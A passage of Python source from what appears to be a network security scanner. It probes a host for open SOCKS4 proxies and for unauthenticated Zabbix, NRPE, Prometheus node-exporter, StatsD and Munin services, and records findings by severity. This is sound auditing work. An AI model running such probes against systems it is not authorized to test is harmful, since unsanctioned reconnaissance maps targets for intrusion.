                findings.append(_f(
                    "CRITICAL",
                    "SOCKS4_PROXY_OPEN",
                    "SOCKS4 proxy on port 1080 granted unauthenticated CONNECT request "
                    "(CD=0x5a, request granted); arbitrary TCP tunneling without credentials",
                    1080,
                ))
        except (OSError, socket.timeout):
            pass
        finally:
            try:
                sock4.close()
            except Exception:
                pass

    return findings


# ---------------------------------------------------------------------------
# Monitoring / scan-detection surface detection
# ---------------------------------------------------------------------------

def probe_port_scan_detection_surface(host: str, port: int = 0, timeout: float = 3.0) -> list:
    """Detect exposed monitoring and scan-detection management services.

    Maps the operational visibility surface reachable without authentication
    (per Black Hat Go ch02 network scanning and service fingerprinting coverage):
      - TCP 10050 (Zabbix agent): "agent.version\\n" -> text response ->
        HIGH ZABBIX_AGENT_EXPOSED; version extracted.
      - TCP 5666 (NRPE): 1034-byte NRPE v2 query packet; any response ->
        HIGH NRPE_CHECK_EXPOSED.
      - TCP 9100 (Prometheus node-exporter): GET /metrics; response containing
        "# HELP" or "# TYPE" -> HIGH NODE_EXPORTER_METRICS_EXPOSED; metric
        family count reported.
      - UDP 8125 (StatsD): counter datagram; any response ->
        MEDIUM STATSD_PORT_RESPONSIVE.
      - TCP 4949 (Munin node): "version\\n" after optional banner; text response ->
        HIGH MUNIN_NODE_EXPOSED; version extracted.

    Returns list of dicts: {severity, title, detail, host, port}.
    """
    findings: list = []

    def _f(severity: str, title: str, detail: str, p: int) -> dict:
        return {"severity": severity, "title": title, "detail": detail,
                "host": host, "port": p}

    def _tcp(p: int):
        """Return a connected TCP socket, or None on failure."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(timeout)
            s.connect((host, p))
            return s
        except (OSError, socket.timeout):
            try:
                s.close()
            except Exception:
                pass
            return None

    def _recv_text(s, nbytes: int = 4096) -> str:
        """Drain up to nbytes from socket, return as latin-1 string."""
        raw = b""
        try:
            while len(raw) < nbytes:
                chunk = s.recv(min(1024, nbytes - len(raw)))
                if not chunk:
                    break
                raw += chunk
        except (OSError, socket.timeout):
            pass
        return raw.decode("latin-1", errors="replace")

    # -- Zabbix agent: TCP 10050 -----------------------------------------------
    # Zabbix agent protocol (v2+): client sends a plaintext key name followed
    # by "\n". Response is prefixed with "ZBXD\x01" + 8-byte length header in
    # older versions, or bare text in very old agents. "agent.version" returns
    # the agent version string. Any non-empty response confirms live listener.
    _zabbix_port = 10050
    sock_zx = _tcp(_zabbix_port)
    if sock_zx is not None:
        try:
            sock_zx.sendall(b"agent.version\n")
            resp_zx = _recv_text(sock_zx, 256)
            if resp_zx.strip():
                # Strip ZBXD protocol header (magic + 8-byte length) if present
                clean = re.sub(r"ZBXD[\x00-\xff]{8}", "", resp_zx).strip()
                clean = clean[:80]
                findings.append(_f(
                    "HIGH",
                    "ZABBIX_AGENT_EXPOSED",
                    f"Zabbix agent on port {_zabbix_port} responds to unauthenticated "
                    f"key requests; version: {repr(clean)}; arbitrary item collection "
                    "(process names, file contents, shell commands) possible without "
                    "credentials",
                    _zabbix_port,
                ))
        except (OSError, socket.timeout):
            pass
        finally:
            try:
                sock_zx.close()
            except Exception:
                pass

    # -- NRPE: TCP 5666 -------------------------------------------------------
    # Nagios Remote Plugin Executor v2 wire format:
    #   packet_version(2BE) + packet_type(2BE) + crc32(4BE) + result_code(2BE)
    #   + command_buffer(1024 bytes, null-padded)
    # packet_type=1 = QUERY. Any response (including error) confirms live NRPE.
    _nrpe_port = 5666
    _nrpe_hdr = struct.pack("!HHIh", 2, 1, 0, 0)   # 10 bytes
    _nrpe_buf = b"check_nrpe" + b"\x00" * 1014      # 1024 bytes command buffer
    _nrpe_pkt = _nrpe_hdr + _nrpe_buf
    sock_nrpe = _tcp(_nrpe_port)
    if sock_nrpe is not None:
        try:
            sock_nrpe.sendall(_nrpe_pkt)
            resp_nrpe = b""
            try:
                resp_nrpe = sock_nrpe.recv(1034)
            except (OSError, socket.timeout):
                pass
            if resp_nrpe:
                findings.append(_f(
                    "HIGH",
                    "NRPE_CHECK_EXPOSED",
                    f"NRPE (Nagios Remote Plugin Executor) on port {_nrpe_port} returned "
                    f"{len(resp_nrpe)} bytes to unauthenticated probe; plugin execution "
                    "surface exposed; check_command enumeration and plugin abuse possible",
                    _nrpe_port,
                ))
        except (OSError, socket.timeout):
            pass
        finally:
            try:
                sock_nrpe.close()
            except Exception:
                pass

    # -- Prometheus node-exporter: TCP 9100 ------------------------------------
    # GET /metrics returns Prometheus text exposition format. "# HELP" and
    # "# TYPE" comment lines are mandatory prefix for each metric family.
    # Presence confirms live, unauthenticated node-exporter scrape endpoint.
    _prom_port = 9100
    sock_prom = _tcp(_prom_port)
    if sock_prom is not None:
        try:
            _prom_req = (
                b"GET /metrics HTTP/1.0\r\nHost: "
                + host.encode("latin-1")
                + b"\r\nAccept: text/plain\r\n\r\n"
            )
            sock_prom.sendall(_prom_req)
            resp_prom = _recv_text(sock_prom, 8192)
            if "# HELP" in resp_prom or "# TYPE" in resp_prom:
                n_help = resp_prom.count("# HELP")
                findings.append(_f(
                    "HIGH",
                    "NODE_EXPORTER_METRICS_EXPOSED",
                    f"Prometheus node-exporter on port {_prom_port} exposes {n_help} "
                    "metric families without authentication; OS-level CPU, memory, disk, "
                    "network, and filesystem telemetry readable by untrusted clients",
                    _prom_port,
                ))
        except (OSError, socket.timeout):
            pass
        finally:
            try:
                sock_prom.close()
            except Exception:
                pass

    # -- StatsD: UDP 8125 ------------------------------------------------------
    # StatsD accepts plaintext UDP datagrams: "<metric>:<value>|<type>".
    # Most implementations are fire-and-forget (no response). A response
    # indicates a non-standard or debug mode; confirms bidirectional UDP surface.
    _statsd_port = 8125
    try:
        sock_sd = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock_sd.settimeout(timeout)
        try:
            sock_sd.sendto(b"ablation.test:1|c", (host, _statsd_port))
            resp_sd, _ = sock_sd.recvfrom(256)
            if resp_sd:
                findings.append(_f(
                    "MEDIUM",
                    "STATSD_PORT_RESPONSIVE",
                    f"StatsD on UDP port {_statsd_port} returned {len(resp_sd)} bytes; "
                    "bidirectional UDP confirmed; metrics aggregation service accessible "
                    "to untrusted clients",
                    _statsd_port,
                ))
        except (OSError, socket.timeout):
            pass
        finally:
            sock_sd.close()
    except OSError:
        pass

    # -- Munin node: TCP 4949 --------------------------------------------------
    # Munin node emits a banner ("# munin node at <hostname>") on connect, then
    # accepts single-line commands. "version\n" returns a version line.
    # Any non-empty combined response confirms the service is live.
    _munin_port = 4949
    sock_mn = _tcp(_munin_port)
    if sock_mn is not None:
        try:
            # Consume optional banner before sending the command
            banner = _recv_text(sock_mn, 512)
            sock_mn.sendall(b"version\n")
            resp_mn = _recv_text(sock_mn, 512)
            combined = (banner + resp_mn).strip()
            if combined:
                _vm = re.search(r"munins?\s+node.*?(\d[\d.]*)", combined, re.IGNORECASE)
                _ver = _vm.group(1) if _vm else "unknown"
                findings.append(_f(
                    "HIGH",
                    "MUNIN_NODE_EXPOSED",
                    f"Munin monitoring node v{_ver} on port {_munin_port} responds to "
                    "unauthenticated queries; system resource metrics (CPU, disk, network, "
                    "processes) readable without authentication",
                    _munin_port,
                ))
        except (OSError, socket.timeout):
            pass
        finally:
            try:
                sock_mn.close()
            except Exception:
                pass

    return findings
